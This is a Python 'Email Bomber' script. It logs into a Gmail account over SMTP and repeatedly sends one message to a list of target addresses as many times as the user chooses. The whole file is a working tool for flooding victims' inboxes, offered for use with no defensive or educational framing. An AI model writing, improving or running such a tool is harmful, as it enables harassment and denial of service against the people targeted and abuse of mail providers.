import smtplib
import os 
import time
#Enter Account Details
def Account():
    emailbomber()
    email = input("Enter Email: ")
    password = input("Enter Password: ")
    clear()
    return email, password

#main code
def sendEmail(email, password, recipient_emails, subject, message, count):
    while True:  
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
        
            emailbomber()
            for recipientemail in recipient_emails:
                full_message = f"From: {email}\nTo: {recipientemail}\nSubject: {subject}\n\n{message}"
                for i in range(count):
                    server.sendmail(email, recipientemail, full_message)
                    print(f"Email sent to {recipientemail}! ({i+1}/{count})")
            print("")
            server.quit()
            break  

        except smtplib.SMTPAuthenticationError:
            print("Failed to authenticate. enter your email and password again.")
            time.sleep(1)
            clear()
            email, password = Account() #retry login account
def emailbomber():
    print(r""" 
  ______                 _ _   ____                  _               
 |  ____|               (_) | |  _ \                | |              
 | |__   _ __ ___   __ _ _| | | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  __| | '_ ` _ \ / _` | | | |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |____| | | | | | (_| | | | | |_) | (_) | | | | | | |_) |  __/ |  
 |______|_| |_| |_|\__,_|_|_| |____/ \___/|_| |_| |_|_.__/ \___|_|  
          
          """)
#clears the terminal
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
#run account()
email, password = Account()

#email of the target 
emailbomber()
recipients_input = input("Enter recipient emails separated by space: ")
recipient_emails = [r.strip() for r in recipients_input.split(" ")]
clear()

#other input
emailbomber()
subject = input("Enter Subject: ")
message = input("Enter Message: ")
clear()

emailbomber()
while True:
    count = (input("Times you want to send: "))
    if count.isdigit() and int(count) > 0:
        count = int(count)
        clear()
        break

    else:
        print("Please enter a valid number.")

        
#run the main code
sendEmail(email, password, recipient_emails, subject, message, count)



    